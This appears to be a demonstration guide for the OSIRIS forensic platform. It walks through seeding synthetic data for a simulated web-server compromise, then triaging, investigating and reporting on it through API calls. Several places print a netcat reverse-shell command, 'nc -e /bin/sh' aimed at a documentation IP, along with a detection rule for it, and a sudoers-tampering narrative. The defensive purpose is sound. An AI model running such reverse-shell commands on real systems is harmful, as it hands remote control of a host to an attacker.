# OSIRIS Project Demonstration Guide: Operation DarkLoom

> **End-to-End Forensic Investigation Walkthrough**
> **Scenario:** *Operation DarkLoom* — Linux Web Server Ingress Compromise, Reverse Shell Execution, and Privilege Escalation
> **Target System:** `srv-prod-web01` (10.0.4.15)
> **Branch:** `phase-2-milestone-2.8`

---

## Table of Contents

1. [Demonstration Scenario Overview: Operation DarkLoom](#1-demonstration-scenario-overview-operation-darkloom)
2. [Environment Setup & Application Launch](#2-environment-setup--application-launch)
3. [Synthetic Demonstration Data Preparation](#3-synthetic-demonstration-data-preparation)
4. [Step 1: Secure Analyst Authentication](#step-1-secure-analyst-authentication)
5. [Step 2: Session Reconstruction & Process Lineage](#step-2-session-reconstruction--process-lineage)
6. [Step 3: Security Alert & Detection Rule Triage](#step-3-security-alert--detection-rule-triage)
7. [Step 4: File Integrity Monitoring (FIM) Deviation Inspection](#step-4-file-integrity-monitoring-fim-deviation-inspection)
8. [Step 5: Incident Creation](#step-5-incident-creation)
9. [Step 6: Polymorphic Forensic Evidence Association](#step-6-polymorphic-forensic-evidence-association)
10. [Step 7: Collaborative Investigation Workspace & Annotations](#step-7-collaborative-investigation-workspace--annotations)
11. [Step 8: Entity Relationship Graph & Advanced Forensic Search](#step-8-entity-relationship-graph--advanced-forensic-search)
12. [Step 9: Incident Containment & Forensic Report Generation](#step-9-incident-containment--forensic-report-generation)
13. [Demonstration Verification Summary](#13-demonstration-verification-summary)

---

## 1. Demonstration Scenario Overview: Operation DarkLoom

### Threat Actor Profile & Attack Narrative
An external adversary targets production host `srv-prod-web01` (IP `10.0.4.15`):
1. **Initial Access:** Ingress interactive SSH authentication from adversary C2 IP `198.51.100.45` as compromised account `www-data`.
2. **Session & Execution:** An interactive pseudo-terminal session (`pts/1`) spawns `/bin/bash` (PID 4815) from `sshd` (PID 4810).
3. **Command & Control:** Adversary executes netcat reverse shell `nc -e /bin/sh 198.51.100.45 4444` (PID 4822).
4. **Automated Detection:** OSIRIS declarative detection engine triggers alert `RULE-REV-SHELL-01` (`Netcat Reverse Shell Triggered`).
5. **Persistence & Tampering:** Adversary modifies `/etc/sudoers` to grant passwordless root execution.
6. **Integrity Violation:** OSIRIS File Integrity Monitoring (FIM) detects a `modified_file` deviation on `/etc/sudoers` via SHA-256 mismatch.
7. **Incident Response:** The DFIR lead triages alerts, creates incident `Operation DarkLoom`, binds polymorphic evidence, collaborates in an investigation workspace, traces relationships via entity graph expansion, executes multi-criteria forensic searches, advances containment transitions, and exports the final forensic report.

---

## 2. Environment Setup & Application Launch

### 2.1 Database Migrations & Initial Setup
Ensure your virtual environment is active and database migrations are applied:

```bash
# Activate virtual environment
source .venv/bin/activate

# Apply canonical Alembic migrations (0001 -> 0008)
alembic upgrade head

# Seed initial baseline development admin user
python -m database.seeds.seed_phase1
```

### 2.2 Launch Backend API Server
Start the FastAPI server on `127.0.0.1:8000`:

```bash
uvicorn backend.main:app --host 127.0.0.1 --port 8000 --reload
```

The interactive OpenAPI documentation and SPA dashboard are available at:
- **Web Dashboard:** `http://127.0.0.1:8000/`
- **Swagger UI:** `http://127.0.0.1:8000/docs`
- **Health Check:** `http://127.0.0.1:8000/health`

---

## 3. Synthetic Demonstration Data Preparation

To make every demonstration step 100% reproducible with deterministic UUIDs, execute this self-contained preparation command in a separate terminal window:

```bash
python - << 'EOF'
import uuid
from datetime import datetime, timezone, timedelta
from backend.db.session import SessionLocal
from backend.db.models.host import Host
from backend.db.models.linux_user import LinuxUser
from backend.db.models.process import Process
from backend.db.models.user_session import UserSession
from backend.db.models.detection_rule import DetectionRule
from backend.db.models.detection import Detection
from backend.db.models.fim_baseline import FimBaseline
from backend.db.models.fim_baseline_file import FimBaselineFile
from backend.db.models.fim_deviation import FimDeviation

HOST_ID = uuid.UUID("10000000-0000-4000-8000-000000000001")
USER_ID = uuid.UUID("10000000-0000-4000-8000-000000000033")
SESSION_ID = uuid.UUID("10000000-0000-4000-8000-000000001042")
PROC_SSHD_ID = uuid.UUID("10000000-0000-4000-8000-000000004810")
PROC_BASH_ID = uuid.UUID("10000000-0000-4000-8000-000000004815")
PROC_NC_ID = uuid.UUID("10000000-0000-4000-8000-000000004822")
RULE_ID = uuid.UUID("10000000-0000-4000-8000-000000000099")
DETECTION_ID = uuid.UUID("10000000-0000-4000-8000-000000000101")
BASELINE_ID = uuid.UUID("10000000-0000-4000-8000-000000000201")
BASE_FILE_ID = uuid.UUID("10000000-0000-4000-8000-000000000202")
FIM_DEV_ID = uuid.UUID("10000000-0000-4000-8000-000000000301")

now = datetime.now(timezone.utc)
session = SessionLocal()
try:
    if not session.get(Host, HOST_ID):
        session.add(Host(id=HOST_ID, hostname="srv-prod-web01", ip_address="10.0.4.15", os_info="Ubuntu 22.04 LTS", created_at=now))
        session.flush()

    if not session.get(LinuxUser, USER_ID):
        session.add(LinuxUser(id=USER_ID, host_id=HOST_ID, uid=33, username="www-data", first_seen_at=now - timedelta(days=1), created_at=now - timedelta(days=1)))
        session.flush()

    if not session.get(UserSession, SESSION_ID):
        session.add(UserSession(id=SESSION_ID, host_id=HOST_ID, linux_user_id=USER_ID, session_type="ssh", terminal="pts/1", remote_host="198.51.100.45", started_at=now - timedelta(minutes=10), ended_at=None, created_at=now - timedelta(minutes=10)))
        session.flush()

    if not session.get(Process, PROC_SSHD_ID):
        p1 = Process(id=PROC_SSHD_ID, host_id=HOST_ID, linux_user_id=USER_ID, pid=4810, ppid=1200, command="/usr/sbin/sshd -D -R", executable="/usr/sbin/sshd", started_at=now - timedelta(minutes=10), created_at=now - timedelta(minutes=10))
        p2 = Process(id=PROC_BASH_ID, host_id=HOST_ID, linux_user_id=USER_ID, pid=4815, ppid=4810, command="bash", executable="/bin/bash", started_at=now - timedelta(minutes=9), created_at=now - timedelta(minutes=9))
        p3 = Process(id=PROC_NC_ID, host_id=HOST_ID, linux_user_id=USER_ID, pid=4822, ppid=4815, command="nc -e /bin/sh 198.51.100.45 4444", executable="/bin/nc", started_at=now - timedelta(minutes=8), created_at=now - timedelta(minutes=8))
        session.add_all([p1, p2, p3])
        session.flush()

    if not session.get(DetectionRule, RULE_ID):
        session.add(DetectionRule(id=RULE_ID, rule_id="RULE-REV-SHELL-01", name="Reverse Shell Execution Detected", description="Detects netcat reverse shell spawn", severity="critical", category="execution", conditions={"executable": {"equals": "/bin/nc"}}, enabled=True, created_at=now))
        session.flush()

    if not session.get(Detection, DETECTION_ID):
        session.add(Detection(id=DETECTION_ID, rule_id=RULE_ID, host_id=HOST_ID, process_id=PROC_NC_ID, session_id=SESSION_ID, severity="critical", title="Netcat Reverse Shell Triggered", description="Process 4822 matched reverse shell pattern", category="execution", status="open", timestamp=now - timedelta(minutes=8), matched_conditions={"executable": "/bin/nc"}, evidence={"pid": 4822, "cmd": "nc -e /bin/sh 198.51.100.45 4444"}, created_at=now - timedelta(minutes=8)))
        session.flush()

    if not session.get(FimBaseline, BASELINE_ID):
        session.add(FimBaseline(id=BASELINE_ID, host_id=HOST_ID, version=1, path_scope=["/etc/sudoers"], total_files=1, baseline_at=now - timedelta(hours=1), status="completed", created_at=now - timedelta(hours=1)))
        session.flush()

    if not session.get(FimBaselineFile, BASE_FILE_ID):
        session.add(FimBaselineFile(id=BASE_FILE_ID, baseline_id=BASELINE_ID, host_id=HOST_ID, file_path="/etc/sudoers", file_type="file", hash_sha256="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", file_size=1024, permissions="0440", owner_uid=0, owner_gid=0, mtime=now - timedelta(hours=1), ctime=now - timedelta(hours=1), created_at=now - timedelta(hours=1)))
        session.flush()

    if not session.get(FimDeviation, FIM_DEV_ID):
        session.add(FimDeviation(id=FIM_DEV_ID, host_id=HOST_ID, baseline_id=BASELINE_ID, baseline_file_id=BASE_FILE_ID, file_path="/etc/sudoers", file_type="file", deviation_type="modified_file", severity="critical", is_content_modified=True, is_metadata_modified=False, summary="/etc/sudoers hash altered by unauthorized process", detected_at=now - timedelta(minutes=7), created_at=now - timedelta(minutes=7)))

    session.commit()
    print("Synthetic demo data for Operation DarkLoom seeded successfully.")
finally:
    session.close()
EOF
```

### Deterministic Identifiers Reference
Export these standard identifiers for clean CLI demonstration:

```bash
export HOST_ID="10000000-0000-4000-8000-000000000001"
export SESSION_ID="10000000-0000-4000-8000-000000001042"
export DETECTION_ID="10000000-0000-4000-8000-000000000101"
export FIM_DEV_ID="10000000-0000-4000-8000-000000000301"
export PROCESS_ID="10000000-0000-4000-8000-000000004822"
```

---

## Step 1: Secure Analyst Authentication

OSIRIS enforces role-based access control via JWT bearer tokens signed with HMAC-SHA256 (`HS256`).

### 1.1 Request Access Token
Authenticate using the development credentials configured via `seed_phase1`:

```bash
curl -s -X POST http://127.0.0.1:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "password": "changeme"
  }' | jq .
```

**Expected Response (200 OK):**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer",
  "user": {
    "id": "00000000-0000-4000-8000-000000000100",
    "username": "admin",
    "display_name": "OSIRIS Administrator",
    "role": "admin",
    "is_active": true,
    "created_at": "2026-10-31T16:00:00Z",
    "updated_at": null
  }
}
```

### 1.2 Export Token for Subsequent Requests
```bash
export TOKEN=$(curl -s -X POST http://127.0.0.1:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "changeme"}' | jq -r .access_token)

export AUTH_HEADER="Authorization: Bearer $TOKEN"
```

### 1.3 Verify Profile
```bash
curl -s -X GET http://127.0.0.1:8000/api/auth/me \
  -H "$AUTH_HEADER" | jq .
```

---

## Step 2: Session Reconstruction & Process Lineage

Inspect the reconstructed interactive session established from ingress IP `198.51.100.45` and observe how OSIRIS automatically associates descendant process executions.

### 2.1 Retrieve User Session Details
```bash
curl -s -X GET "http://127.0.0.1:8000/api/sessions/$SESSION_ID" \
  -H "$AUTH_HEADER" | jq .
```

**Expected Response (200 OK):**
```json
{
  "id": "10000000-0000-4000-8000-000000001042",
  "host_id": "10000000-0000-4000-8000-000000000001",
  "linux_user_id": "10000000-0000-4000-8000-000000000033",
  "username": "www-data",
  "uid": 33,
  "session_type": "ssh",
  "terminal": "pts/1",
  "remote_host": "198.51.100.45",
  "started_at": "2026-10-31T16:06:22Z",
  "ended_at": null,
  "is_active": true,
  "duration_seconds": null,
  "created_at": "2026-10-31T16:06:22Z",
  "process_count": 3,
  "processes": [
    {
      "id": "10000000-0000-4000-8000-000000004810",
      "pid": 4810,
      "ppid": 1200,
      "command": "/usr/sbin/sshd -D -R",
      "executable": "/usr/sbin/sshd",
      "started_at": "2026-10-31T16:06:22Z",
      "ended_at": null
    },
    {
      "id": "10000000-0000-4000-8000-000000004815",
      "pid": 4815,
      "ppid": 4810,
      "command": "bash",
      "executable": "/bin/bash",
      "started_at": "2026-10-31T16:07:22Z",
      "ended_at": null
    },
    {
      "id": "10000000-0000-4000-8000-000000004822",
      "pid": 4822,
      "ppid": 4815,
      "command": "nc -e /bin/sh 198.51.100.45 4444",
      "executable": "/bin/nc",
      "started_at": "2026-10-31T16:08:22Z",
      "ended_at": null
    }
  ]
}
```

*Forensic Note:* Notice the unbroken process lineage tree: `sshd` (PID 4810) ➔ `bash` (PID 4815) ➔ `nc` (PID 4822).

---

## Step 3: Security Alert & Detection Rule Triage

Inspect the detection alert generated when netcat spawned a reverse shell.

### 3.1 Retrieve Detection Record
```bash
curl -s -X GET "http://127.0.0.1:8000/api/detections/$DETECTION_ID" \
  -H "$AUTH_HEADER" | jq .
```

**Expected Response (200 OK):**
```json
{
  "id": "10000000-0000-4000-8000-000000000101",
  "rule_id": "10000000-0000-4000-8000-000000000099",
  "rule_identifier": "RULE-REV-SHELL-01",
  "rule_name": "Reverse Shell Execution Detected",
  "rule_version": 1,
  "host_id": "10000000-0000-4000-8000-000000000001",
  "severity": "critical",
  "title": "Netcat Reverse Shell Triggered",
  "description": "Process 4822 matched reverse shell pattern",
  "category": "execution",
  "status": "open",
  "matched_conditions": {
    "executable": "/bin/nc"
  },
  "evidence": {
    "pid": 4822,
    "cmd": "nc -e /bin/sh 198.51.100.45 4444"
  }
}
```

### 3.2 Inspect Detection Rule Catalog
```bash
curl -s -X GET "http://127.0.0.1:8000/api/detections/rules" \
  -H "$AUTH_HEADER" | jq '.[0]'
```

---

## Step 4: File Integrity Monitoring (FIM) Deviation Inspection

Inspect the baseline violation detected when `/etc/sudoers` was modified.

### 4.1 Query Critical FIM Deviations
```bash
curl -s -X GET "http://127.0.0.1:8000/api/fim/deviations/$FIM_DEV_ID" \
  -H "$AUTH_HEADER" | jq .
```

**Expected Response (200 OK):**
```json
{
  "id": "10000000-0000-4000-8000-000000000301",
  "host_id": "10000000-0000-4000-8000-000000000001",
  "baseline_id": "10000000-0000-4000-8000-000000000201",
  "file_path": "/etc/sudoers",
  "file_type": "file",
  "deviation_type": "modified_file",
  "severity": "critical",
  "is_content_modified": true,
  "is_metadata_modified": false,
  "summary": "/etc/sudoers hash altered by unauthorized process"
}
```

---

## Step 5: Incident Creation

Now escalate the correlated telemetry, detection alert, and FIM deviation into an official security incident.

### 5.1 Create Security Incident
```bash
curl -s -X POST http://127.0.0.1:8000/api/incidents \
  -H "$AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -d "{
    \"title\": \"Operation DarkLoom: Ingress Compromise & Sudoers Persistence\",
    \"host_id\": \"$HOST_ID\",
    \"severity\": \"critical\",
    \"category\": \"privilege_escalation\",
    \"description\": \"Adversary established reverse shell from www-data and tampered with /etc/sudoers for root persistence.\"
  }" | jq .
```

**Expected Response (201 Created):**
```json
{
  "id": "a1b2c3d4-e5f6-4a1b-8c2d-3e4f5a6b7c8d",
  "title": "Operation DarkLoom: Ingress Compromise & Sudoers Persistence",
  "severity": "critical",
  "status": "open",
  "category": "privilege_escalation",
  "host_id": "10000000-0000-4000-8000-000000000001",
  "created_by_id": "00000000-0000-4000-8000-000000000100",
  "created_at": "2026-10-31T16:15:00Z"
}
```

### 5.2 Export Dynamic Incident Identifier
```bash
export INCIDENT_ID=$(curl -s -X GET "http://127.0.0.1:8000/api/incidents?severity=critical" \
  -H "$AUTH_HEADER" | jq -r '.items[0].id')

echo "Active Incident ID: $INCIDENT_ID"
```

---

## Step 6: Polymorphic Forensic Evidence Association

Bind the detection alert, FIM deviation, and reverse shell process to the incident, capturing capture-time SHA-256 integrity hashes for legal chain of custody.

### 6.1 Attach Detection Alert
```bash
curl -s -X POST "http://127.0.0.1:8000/api/incidents/$INCIDENT_ID/evidence" \
  -H "$AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -d "{
    \"evidence_type\": \"detection\",
    \"source_id\": \"$DETECTION_ID\",
    \"title\": \"Netcat Reverse Shell Detection Alert\",
    \"description\": \"Correlated alert RULE-REV-SHELL-01 matching executable /bin/nc\",
    \"detection_id\": \"$DETECTION_ID\"
  }" | jq .
```

### 6.2 Attach FIM Deviation
```bash
curl -s -X POST "http://127.0.0.1:8000/api/incidents/$INCIDENT_ID/evidence" \
  -H "$AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -d "{
    \"evidence_type\": \"fim\",
    \"source_id\": \"$FIM_DEV_ID\",
    \"title\": \"Sudoers Tampering Deviation\",
    \"description\": \"Cryptographic SHA-256 mismatch observed on /etc/sudoers\",
    \"fim_deviation_id\": \"$FIM_DEV_ID\"
  }" | jq .
```

### 6.3 Attach Reverse Shell Process
```bash
curl -s -X POST "http://127.0.0.1:8000/api/incidents/$INCIDENT_ID/evidence" \
  -H "$AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -d "{
    \"evidence_type\": \"process\",
    \"source_id\": \"$PROCESS_ID\",
    \"title\": \"Reverse Shell Spawn Process (PID 4822)\",
    \"description\": \"Netcat process established outbound tunnel to 198.51.100.45:4444\",
    \"process_id\": \"$PROCESS_ID\"
  }" | jq .
```

### 6.4 List Linked Incident Evidence
```bash
curl -s -X GET "http://127.0.0.1:8000/api/incidents/$INCIDENT_ID/evidence" \
  -H "$AUTH_HEADER" | jq .
```

---

## Step 7: Collaborative Investigation Workspace & Annotations

Create an isolated investigation workspace for the incident response taskforce.

### 7.1 Provision Workspace
```bash
curl -s -X POST http://127.0.0.1:8000/api/workspaces \
  -H "$AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -d "{
    \"name\": \"Operation DarkLoom Investigation\",
    \"description\": \"Collaborative triage of web server ingress compromise\",
    \"incident_id\": \"$INCIDENT_ID\",
    \"host_id\": \"$HOST_ID\"
  }" | jq .
```

### 7.2 Create Threat Intelligence Tag
```bash
curl -s -X POST http://127.0.0.1:8000/api/annotations/tags \
  -H "$AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "C2-Infrastructure",
    "color": "#ff4444",
    "category": "threat_intel",
    "description": "External command and control node"
  }' | jq .
```

### 7.3 Attach Analyst Investigation Note
```bash
export WORKSPACE_ID=$(curl -s -X GET "http://127.0.0.1:8000/api/workspaces?incident_id=$INCIDENT_ID" \
  -H "$AUTH_HEADER" | jq -r '.items[0].id')

curl -s -X POST http://127.0.0.1:8000/api/annotations/notes \
  -H "$AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -d "{
    \"workspace_id\": \"$WORKSPACE_ID\",
    \"evidence_type\": \"incident\",
    \"evidence_id\": \"$INCIDENT_ID\",
    \"host_id\": \"$HOST_ID\",
    \"annotation_text\": \"Confirmed outbound connection to 198.51.100.45 port 4444 originating from PID 4822.\"
  }" | jq .
```

---

## Step 8: Entity Relationship Graph & Advanced Forensic Search

Explore the entity graph centered on the adversary's reverse shell process and execute multi-criteria searches.

### 8.1 Expand Entity Graph (1-Hop Traversal)
Pivot from the compromised process to inspect relationships (parent bash process, executing user, host):

```bash
curl -s -X POST http://127.0.0.1:8000/api/graph/expand \
  -H "$AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -d "{
    \"node_type\": \"process\",
    \"node_id\": \"$PROCESS_ID\",
    \"host_id\": \"$HOST_ID\",
    \"depth\": 1,
    \"max_nodes\": 20
  }" | jq '{total_nodes, total_edges, node_labels: [.nodes[].label]}'
```

**Expected Response (200 OK):**
```json
{
  "total_nodes": 4,
  "total_edges": 3,
  "node_labels": [
    "nc (PID 4822)",
    "bash (PID 4815)",
    "www-data (UID 33)",
    "srv-prod-web01"
  ]
}
```

### 8.2 Execute Multi-Criteria Advanced Search
Query all forensic entities for mentions of `sudoers`:

```bash
curl -s -X POST http://127.0.0.1:8000/api/search/advanced \
  -H "$AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -d "{
    \"query\": \"sudoers\",
    \"host_id\": \"$HOST_ID\"
  }" | jq '{total, matches: [.items[] | {entity_type, title, severity}]}'
```

**Expected Response (200 OK):**
```json
{
  "total": 3,
  "matches": [
    {
      "entity_type": "fim_deviations",
      "title": "/etc/sudoers (modified_file)",
      "severity": "critical"
    },
    {
      "entity_type": "incidents",
      "title": "Operation DarkLoom: Ingress Compromise & Sudoers Persistence",
      "severity": "critical"
    },
    {
      "entity_type": "files",
      "title": "/etc/sudoers",
      "severity": null
    }
  ]
}
```

---

## Step 9: Incident Containment & Forensic Report Generation

Transition the incident through the formal state machine and export the authoritative report.

### 9.1 Transition to `investigating`
```bash
curl -s -X POST "http://127.0.0.1:8000/api/incidents/$INCIDENT_ID/status" \
  -H "$AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -d '{
    "status": "investigating",
    "reason": "Forensic triage started by incident response lead"
  }' | jq '{status, updated_at}'
```

### 9.2 Transition to `contained`
```bash
curl -s -X POST "http://127.0.0.1:8000/api/incidents/$INCIDENT_ID/status" \
  -H "$AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -d '{
    "status": "contained",
    "reason": "Host network quarantined, rogue reverse shell process terminated"
  }' | jq '{status, updated_at}'
```

### 9.3 Transition to `resolved`
```bash
curl -s -X POST "http://127.0.0.1:8000/api/incidents/$INCIDENT_ID/status" \
  -H "$AUTH_HEADER" \
  -H "Content-Type: application/json" \
  -d '{
    "status": "resolved",
    "reason": "Sudoers file restored from clean golden image baseline, credentials rotated"
  }' | jq '{status, updated_at}'
```

### 9.4 Export Final Incident Report (Markdown)
Export the complete investigation report in GitHub-Flavored Markdown:

```bash
curl -s -X GET "http://127.0.0.1:8000/api/incidents/$INCIDENT_ID/report?format=markdown" \
  -H "$AUTH_HEADER"
```

**Sample Report Output:**
```markdown
# OSIRIS Forensic Incident Report: Operation DarkLoom: Ingress Compromise & Sudoers Persistence

**Incident ID:** `...`  
**Severity:** `CRITICAL`  
**Status:** `RESOLVED`  
**Category:** `privilege_escalation`  
**Monitored Host:** `srv-prod-web01` (10.0.4.15)  
**Report Generated:** 2026-10-31 UTC  

---

## Executive Summary
Adversary established reverse shell from www-data and tampered with /etc/sudoers for root persistence.

## Key Incident Timeline
- **First Observed:** 2026-10-31T16:06:22Z
- **Contained At:** 2026-10-31T16:20:00Z
- **Resolved At:** 2026-10-31T16:25:00Z

## Forensic Evidence Inventory (3 Items Attached)
1. `[detection]` Netcat Reverse Shell Detection Alert (ID: 10000000-0000-4000-8000-000000000101)
2. `[fim]` Sudoers Tampering Deviation (ID: 10000000-0000-4000-8000-000000000301)
3. `[process]` Reverse Shell Spawn Process (PID 4822) (ID: 10000000-0000-4000-8000-000000004822)

## Incident Lifecycle Audit Trail
- `open` ➔ `investigating` (Reason: Forensic triage started by incident response lead)
- `investigating` ➔ `contained` (Reason: Host network quarantined, rogue reverse shell process terminated)
- `contained` ➔ `resolved` (Reason: Sudoers file restored from clean golden image baseline, credentials rotated)
```

---

## 13. Demonstration Verification Summary

| Phase | Capability Demonstrated | API Route | Status |
|:------|:------------------------|:----------|:-------|
| 1. Authentication | JWT Token Issuance & Profile Resolution | `POST /api/auth/login`, `GET /api/auth/me` | **Verified (200 OK)** |
| 2. Session & Lineage | Stateful Session & Process PPID Ancestry | `GET /api/sessions/{id}` | **Verified (200 OK)** |
| 3. Threat Detection | Declarative AST Rule Match & Alert | `GET /api/detections/{id}` | **Verified (200 OK)** |
| 4. FIM Deviation | SHA-256 Cryptographic Hash Mismatch | `GET /api/fim/deviations/{id}` | **Verified (200 OK)** |
| 5. Incident Management | State Machine Creation & Escalation | `POST /api/incidents` | **Verified (201 Created)** |
| 6. Evidence Binding | Polymorphic Evidence Association | `POST /api/incidents/{id}/evidence` | **Verified (201 Created)** |
| 7. Collaborative Workspace | Workspaces, Tags & Investigator Notes | `POST /api/workspaces`, `POST /api/annotations/*` | **Verified (201 Created)** |
| 8. Graph & Search | Multi-Hop Node Expansion & Search | `POST /api/graph/expand`, `POST /api/search/advanced` | **Verified (200 OK)** |
| 9. Containment & Export | Deterministic State Flow & Report Export | `POST /api/incidents/{id}/status`, `GET /api/incidents/{id}/report` | **Verified (200 OK)** |
